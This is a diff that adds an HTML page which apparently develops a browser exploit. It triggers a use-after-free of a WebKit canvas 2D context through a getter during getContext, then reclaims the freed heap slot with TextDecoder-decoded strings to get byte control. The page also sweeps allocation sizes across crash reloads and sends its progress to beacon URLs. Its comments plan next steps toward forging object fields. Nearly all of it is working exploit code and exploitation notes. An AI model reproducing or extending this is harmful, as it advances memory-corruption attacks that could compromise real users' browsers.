@@ -1,0 +1,153 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="45;url=/"><title>V922</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style></head><body>
+<div id="log"></div><script>
+// V922 -- TextDecoder StringImpl DATA-BUFFER reclaim of the freed CRC2D slot.  ONE triggerUAF.
+//
+// THE PATH BEING REVIVED (BREAKTHROUGH_textdecoder_reclaim_1736.md, lost in the V880/V898 churn)
+//   TextDecoder.decode() allocates its result's StringImpl DATA buffer with StringImplMalloc =
+//   FastMalloc = the same heap family as CRC2D. Unlike ArrayBuffer (PrimitiveGigacage, different
+//   reservation) and unlike a JS-built string (header-prefixed), the data buffer is:
+//     - a separate plain fastMalloc chunk,
+//     - byte-for-byte controlled from JS via the decoded characters,
+//     - positioned at offset 0 of that chunk, with NO StringImpl header in front of it.
+//   For a 768-byte CRC2D that is exactly the shape needed: our bytes land at slot+0.
+//
+// WHY V920 DOES NOT CONTRADICT THIS (correction posted to the board)
+//   V920 freed a Vector<double> buffer, allocated a string, then allocated the vector again and
+//   watched for the string to be clobbered. If the string HAD taken the slot, the second vector
+//   allocation would land elsewhere and nothing would be clobbered -- the test could only ever
+//   report "no overlap". It was confounded by construction. Segregation is NOT established.
+//
+// THE ORACLE (same as V919, where the CRC2D control passed 4/4)
+//   restore() reads m_unrealizedSaveCount at +592 FIRST and returns without dereferencing anything
+//   if it is nonzero. With the data buffer at slot+0, that is simply byte 592 of our decoded string.
+//   Plant 0x01 there:  survive = our buffer is in the slot = byte control at offset 0.
+//                     die     = it is not (or a different field was hit).
+//   Nothing is dereferenced, so a survive cannot be a lucky read.
+//
+// LENGTH: the data buffer is L bytes for L decoded chars. Target the CRC2D class: L = 768.
+//   Latin-1 keeps 0x00-0xFF stable except 0x80-0x9F (windows-1252 remap), so the payload avoids
+//   that band entirely -- every byte here is 0x41 except the single 0x01 at index 592.
+//
+// PRE-REGISTERED INTERPRETATION (fixed before any result)
+//   RECOVER lastP/stage=restore-done, restore=returned -> DATA BUFFER LANDED. Byte-controlled
+//       reclaim exists at offset 0; the forge resumes: +28 CallTracer, +32 m_canvas, +112/+120
+//       m_stateStack, +592 counter are all directly writable from JS via one decode().
+//   death inside restore with stage=pre-restore -> did not land at L=768. Sweep L (704/832/896)
+//       before concluding anything: this is a size question first.
+//   L sweep all die AND the canvas-context control on the same build returns -> data buffer does
+//       not share the CRC2D pool; then segregation is real and the canvas lane is finished.
+//   Control dies -> primitive regressed; nothing here is interpretable.
+//
+// BOOKKEEPING (inherited): off + sizeof(State) = 560, not 576.
+var PRE='V922',B=1,LOG=document.getElementById('log');
+var PT=String(Date.now());
+var MODE=(/[?&]m=(\w+)/.exec(location.search)||[,'td'])[1];
+// LENGTH SWEEP ACROSS CRASH RELOADS. A crash reloads the same url, so the plan must live in
+// localStorage: each load takes the next candidate data-buffer length, and a load that finds the
+// previous length still "in flight" records it as a death before moving on. 768 died on its own.
+var LQ=[768,704,896,832,640,1024,1216,1536];
+var PL='v922plan', plan=null;
+try{plan=JSON.parse(localStorage.getItem(PL)||'null');}catch(e){plan=null;}
+if(!plan||!plan.q){plan={q:LQ.slice(),i:0,active:null,log:[]};}
+if(plan.active!==null&&plan.active!==undefined){
+ plan.log.push(plan.active+(plan.survived?'=LAND':'=DIE'));
+ if(!plan.survived)plan.i++;
+ plan.active=null;plan.survived=false;
+}
+var L=(plan.i<plan.q.length)?plan.q[plan.i]:plan.q[plan.q.length-1];
+plan.active=L;
+function planSave(){try{localStorage.setItem(PL,JSON.stringify(plan));}catch(e){}}
+planSave();
+var J='v922journal';
+function Lg(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(stg,stage,d){var s=('000'+B).slice(-3);B++;
+ var path='/beacon/'+PRE+'-'+s+'-'+stg+'-'+stage+'?d='+encodeURIComponent(String(d==null?'':d))+'&pt='+PT+'&t='+Date.now();
+ Lg(s+' '+stg+' '+stage+' '+d);
+ try{if(navigator.sendBeacon){navigator.sendBeacon(path);}}catch(e){}
+ try{new Image().src=path;}catch(e){}
+ try{new Image().src=path+'&k=3';}catch(e){}
+}
+var BI=1200;var pool=[];for(var i=0;i<BI;i++)pool.push(new Image());
+window.addEventListener('error',function(e){bea('FAIL','JSERR',(e.message||'')+'|L'+e.lineno);});
+function after(ms,fn){setTimeout(fn,ms);}
+
+var j=null;
+try{j=JSON.parse(localStorage.getItem(J)||'null');}catch(e){j=null;}
+if(j&&j.runs){
+ bea('PASS','RECOVER','prev-run='+j.runs+'|mode='+j.mode+'|len='+j.len+'|stage='+j.stage+'|note='+(j.note||''));
+}
+var first=(!j||!j.runs);
+j={runs:first?1:(j.runs+1),mode:MODE,len:L,stage:'boot',note:''};
+function save(){try{localStorage.setItem(J,JSON.stringify(j));}catch(e){}}
+save();
+
+var inner=null,keep=[];
+
+function plantTD(){
+ var dec=new TextDecoder('latin1');
+ for(var n=0;n<32;n++){
+  var u=new Uint8Array(L);
+  for(var i=0;i<L;i++)u[i]=0x41;      // safe Latin-1, avoids the 0x80-0x9F remap band
+  if(592<L)u[592]=0x01;               // becomes slot+592 = m_unrealizedSaveCount
+  keep.push(dec.decode(u));           // StringImpl data buffer = plain FastMalloc, offset 0
+ }
+ return keep.length;
+}
+function plantCtl(){
+ for(var i=0;i<32;i++){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  document.body.appendChild(c);keep.push(c.getContext('2d'));
+ }
+ return keep.length;
+}
+
+try{
+ bea('PASS','PLAN','PT='+PT+'|sweep='+(plan.log.join(';')||'none')+'|trying='+L);
+ bea('ENTER','S0','v922|nam='+MODE+'|len='+L+'|PT='+PT+'|run='+j.runs);
+ for(var i=0;i<400;i++){var a=new Array(32);a[0]=i;a=null;}
+ try{var big=new ArrayBuffer(131072);big=null;}catch(e){}
+ bea('PASS','S2','PT='+PT+'|churn');
+
+ var outer=document.createElement('canvas');outer.width=1;outer.height=1;
+ document.body.appendChild(outer);
+ var desc={};
+ Object.defineProperty(desc,'alpha',{get:function(){
+  bea('ENTER','GET-IN','PT='+PT+'|creating-2d');
+  inner=outer.getContext('2d');
+  bea('ENTER','GET-MID','PT='+PT+'|inner='+(inner?'yes':'no'));
+  try{inner.setLineDash([7,7]);}catch(e){}
+  bea('ENTER','GET-OUT','PT='+PT+'|marker-set');
+  return true;},configurable:true});
+
+ bea('ENTER','S3','PT='+PT+'|about-to-trigger');
+ after(400,function(){
+  j.stage='trigger'; save();
+  var threw='';
+  try{outer.getContext('bitmaprenderer',desc);}catch(e){threw=String(e&&e.message||e);}
+  j.stage='post-trigger'; if(threw)j.note='threw='+threw; save();
+  bea('PASS','S3','PT='+PT+'|trigger-returned|'+(threw?'threw':'clean'));
+  if(!inner){j.note='no-handle';save();bea('FAIL','VERDICT','PT='+PT+'|NO-HANDLE');return;}
+
+  j.stage='plant-pre'; save();
+  var n=(MODE==='ctl')?plantCtl():plantTD();
+  j.stage='plant-done'; save();
+  bea('PASS','PLANT','PT='+PT+'|mode='+MODE+'|len='+L+'|n='+n);
+
+  j.stage='pre-restore'; save();
+  bea('ENTER','RESTORE','PT='+PT+'|about-to-call|mode='+MODE);
+  var r='';
+  try{inner.restore();r='returned';}catch(e){r='THREW:'+String(e&&e.message||e);}
+  j.stage='restore-done'; j.note='restore='+r; save();
+  bea('PASS','RESTORE','PT='+PT+'|'+r+'|mode='+MODE+'|len='+L);
+  if(r==='returned'){
+   plan.survived=true; planSave();
+   bea('PASS','LANDING','PT='+PT+'|LANDED|mode='+MODE+'|len='+L+'|byte-control-at-0');
+   bea('PASS','VERDICT','PT='+PT+'|RECLAIM-PROVEN|object='+(MODE==='ctl'?'CRC2D-control':'TextDecoder-data')+'|len='+L);
+  } else {
+   bea('FAIL','LANDING','PT='+PT+'|NOT-LANDED|mode='+MODE+'|len='+L);
+  }
+  bea('PASS','S9','PT='+PT+'|DONE|mode='+MODE);
+ });
+}catch(e){if(e)bea('FAIL','FATAL',String(e&&e.message||e));}
+</script></body></html>
